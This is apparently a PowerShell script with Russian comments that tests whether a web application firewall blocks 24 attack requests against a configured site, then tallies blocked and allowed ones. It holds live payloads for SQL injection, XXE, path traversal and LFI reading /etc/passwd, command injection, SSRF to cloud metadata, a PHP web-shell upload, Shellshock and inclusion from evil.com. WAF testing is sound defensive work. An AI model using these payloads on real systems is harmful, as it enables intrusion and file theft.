# WAF тесты с использованием PowerShell

# Конфигурация - укажите здесь целевой сайт
$BASE_URL = "https://msproject.site.net/console"

# Инициализация переменных для статистики
$script:TOTAL_TESTS = 24
$script:BLOCKED = 0
$script:ALLOWED = 0
$script:ERRORS = 0
$script:CURRENT_TEST = 0
$script:RESULTS = @()

# Функция для выполнения и проверки теста
function Run-Test($testName, $scriptBlock) {
    $SCRIPT:CURRENT_TEST++
    Write-Host "`n=== Тест $CURRENT_TEST`: $testName ===" -ForegroundColor Cyan
    Write-Host "Выполняется запрос..." -ForegroundColor Gray
    
    $result = $null
    $errorDetails = $null
    $txID = $null
    $statusCode = 0
    
    try {
        # Выполнение скриптблока с тестом
        $result = & $scriptBlock
        $statusCode = 200  # Предполагаем успешный ответ по умолчанию
        $isBlocked = $false
    } catch {
        $errorDetails = $_.Exception.Message
        
        # Проверяем если ошибка связана с 403 Forbidden - это УСПЕШНАЯ блокировка WAF
        if ($errorDetails -match "(403)" -or $errorDetails -match "Forbidden") {
            $statusCode = 403
            $isBlocked = $true
            
            # Попытка извлечь Transaction ID из сообщения об ошибке
            if ($errorDetails -match "Transaction ID: ([a-f0-9-]+)") {
                $txID = $matches[1]
            }
        } else {
            # Это действительно ошибка в выполнении теста
            $statusCode = 0
            $isBlocked = $false
            $SCRIPT:ERRORS++
        }
    }
    
    # Обработка результата в зависимости от статуса
    if ($statusCode -eq 403) {
        Write-Host "✅ Статус: ЗАБЛОКИРОВАНО (HTTP $statusCode)" -ForegroundColor Green
        $SCRIPT:BLOCKED++
        $status = "Заблокирован"
        $SCRIPT:RESULTS += "✅ $testName`: $status (HTTP $statusCode)"
        
        if ($txID) {
            Write-Host "   🔑 Transaction ID: $txID" -ForegroundColor Yellow
            $SCRIPT:RESULTS += "   🔑 Transaction ID: $txID"
        }
    } elseif ($statusCode -eq 0) {
        Write-Host "❌ Ошибка при выполнении запроса: $errorDetails" -ForegroundColor Red
        Write-Host "`nДетали ошибки:" -ForegroundColor Red
        Write-Host "$errorDetails" -ForegroundColor Red
        $status = "Ошибка"
        $SCRIPT:RESULTS += "❌ $testName`: $status - $errorDetails"
    } else {
        Write-Host "⚠️ Статус: РАЗРЕШЕНО (HTTP $statusCode)" -ForegroundColor Yellow
        $SCRIPT:ALLOWED++
        $status = "Разрешен"
        $SCRIPT:RESULTS += "⚠️ $testName`: $status (HTTP $statusCode)"
        
        if ($result) {
            Write-Host "`nСодержимое ответа:" -ForegroundColor Yellow
            Write-Host "$result" -ForegroundColor Gray
        }
    }
}

# Начало тестов
Write-Host "🚀 Начинаем тестирование атак на WAF..." -ForegroundColor Magenta
Write-Host "📋 Всего запланировано тестов: $TOTAL_TESTS" -ForegroundColor Cyan
Write-Host "🎯 Целевой сайт: $BASE_URL" -ForegroundColor Cyan
Write-Host ""

# Тест 1: SQL Injection
Run-Test "SQL Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/search?q=1'+OR+'1'%3D'1" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 2: Cross-Site Scripting (HTML)
Run-Test "Cross-Site Scripting (HTML)" {
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body "q=<script>alert(1)</script>" `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 3: Cross-Site Scripting (URL)
Run-Test "Cross-Site Scripting (URL)" {
    Invoke-WebRequest -Uri "$BASE_URL/redirect?url=javascript:alert(1)" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 4: XML External Entities (XXE)
Run-Test "XML External Entities (XXE)" {
    $xxePayload = @"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>
"@
    Invoke-WebRequest -Uri "$BASE_URL/api/xml" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/xml"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $xxePayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 5: Path Traversal
Run-Test "Path Traversal" {
    Invoke-WebRequest -Uri "$BASE_URL/files?file=../../../etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 6: NoSQL Injection
Run-Test "NoSQL Injection" {
    $nosqlPayload = '{"search": {"$where": "function() { return true; }"}, "limit": 1}'
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $nosqlPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 7: OS Command Injection
Run-Test "OS Command Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/status?cmd=ping;cat%20/etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 8: Server-Side Request Forgery (SSRF)
Run-Test "Server-Side Request Forgery (SSRF)" {
    Invoke-WebRequest -Uri "$BASE_URL/proxy?url=http://169.254.169.254/latest/meta-data/" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 9: Local File Inclusion (LFI)
Run-Test "Local File Inclusion (LFI)" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=../../../etc/passwd%00" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 10: Server-Side Template Injection (SSTI)
Run-Test "Server-Side Template Injection (SSTI)" {
    Invoke-WebRequest -Uri "$BASE_URL/profile" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body "name={{7*7}}&email=test@example.com" `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 11: XPath Injection - исправленная версия
Run-Test "XPath Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/users?xpath=/users/user%5Busername/text()=%27admin%27%20or%20%271%27=%271%27%5D" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 12: XML Injection
Run-Test "XML Injection" {
    $xmlInjectionPayload = @"
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <id>1 OR 1=1</id>
  <name>test' OR '1'='1</name>
</user>
"@
    Invoke-WebRequest -Uri "$BASE_URL/api/xml" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/xml"
            "Accept" = "application/xml"
            "User-Agent" = "sqlmap/1.4.7"
        } `
        -Body $xmlInjectionPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 13: Open Redirect
Run-Test "Open Redirect" {
    Invoke-WebRequest -Uri "$BASE_URL/redirect?url=http://evil.com/shell.php" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 14: Web Shell Upload
Run-Test "Web Shell Upload" {
    $boundary = "---------------------------974767299852498929531610575"
    $shellPayload = @"
-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="shell.php.png"
Content-Type: image/png

GIF87a;
<?php
  system('id');
?>
-----------------------------974767299852498929531610575--
"@
    Invoke-WebRequest -Uri "$BASE_URL/upload" `
        -Method POST `
        -Headers @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
            "User-Agent" = "Nessus/8.10.1"
            "X-Requested-With" = "XMLHttpRequest"
        } `
        -Body $shellPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 15: Cross-Site Request Forgery (CSRF) - исправленная версия
Run-Test "Cross-Site Request Forgery (CSRF)" {
    Invoke-WebRequest -Uri "$BASE_URL/login" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "Origin" = "evil.com"
            "Referer" = "evil.com/fake.html"
            "X-CSRF-Token" = "fake-token"
        } `
        -Body "username=<script>alert(document.cookie)</script>&password=password&action=login" `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 16: Vulnerability Scanner
Run-Test "Vulnerability Scanner" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=../../../../etc/passwd%00" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Nessus SOAP"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 17: Automated Bot User Agent
Run-Test "Automated Bot User Agent" {
    $botPayload = '{"search": {"$where": "function() { return true; }"}, "limit": 1}'
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Googlebot/2.1 (+http://www.google.com/bot.html)"
        } `
        -Body $botPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 18: Malformed HTTP Request
Run-Test "Malformed HTTP Request" {
    Invoke-WebRequest -Uri "$BASE_URL/files?file=../../../etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "X-Custom-IP-Authorization" = "127.0.0.1"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 19: Response Splitting
Run-Test "Response Splitting" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=http://evil.com/shell.php" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 20: JWT Attack (None Algorithm)
Run-Test "JWT Attack (None Algorithm)" {
    $jwtToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."
    Invoke-WebRequest -Uri "$BASE_URL/api/admin?alg=none&debug=true" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "Authorization" = "Bearer $jwtToken"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 21: Large Body Test
Run-Test "Large Body Test" {
    Write-Host "Генерация большого payload..." -ForegroundColor Yellow
    $bigPayload = @{
        data = "A" * 50000
    } | ConvertTo-Json
    
    Invoke-WebRequest -Uri "$BASE_URL/api/data" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $bigPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 22: LFI with PHP Wrapper
Run-Test "LFI with PHP Wrapper" {
    Invoke-WebRequest -Uri "$BASE_URL/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 23: RCE via User-Agent
Run-Test "RCE via User-Agent" {
    Invoke-WebRequest -Uri "$BASE_URL/" `
        -Method GET `
        -Headers @{
            "User-Agent" = "() { :; }; /bin/bash -c `"cat /etc/passwd`""
        } `
        -UseBasicParsing -ErrorAction Stop
}

# Тест 24: GraphQL Introspection
Run-Test "GraphQL Introspection" {
    $graphqlPayload = '{"query": "query{__schema{types{name,fields{name}}}}"}'
    Invoke-WebRequest -Uri "$BASE_URL/graphql" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $graphqlPayload `
        -UseBasicParsing -ErrorAction Stop
}

# Отображение отчета о тестировании
Write-Host ""
Write-Host "📊 ====== ОТЧЕТ О ТЕСТИРОВАНИИ PTAF PRO ======" -ForegroundColor Cyan
Write-Host ""
Write-Host "🎯 Всего тестов: $script:TOTAL_TESTS" -ForegroundColor White
Write-Host "🛡️ Успешно заблокировано: $script:BLOCKED" -ForegroundColor Green
Write-Host "⚠️ Разрешено (не заблокировано): $script:ALLOWED" -ForegroundColor Yellow
Write-Host "❌ Ошибок: $script:ERRORS" -ForegroundColor Red
Write-Host ""
Write-Host "📝 Детальный отчет по тестам:" -ForegroundColor Cyan
Write-Host ""

foreach ($result in $script:RESULTS) {
    Write-Host $result
}

Write-Host ""
Write-Host "🎯 ======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "✨ Все тесты выполнены!" -ForegroundColor Green
Write-Host "Код 403 Forbidden означает успешное блокирование WAF" -ForegroundColor Yellow 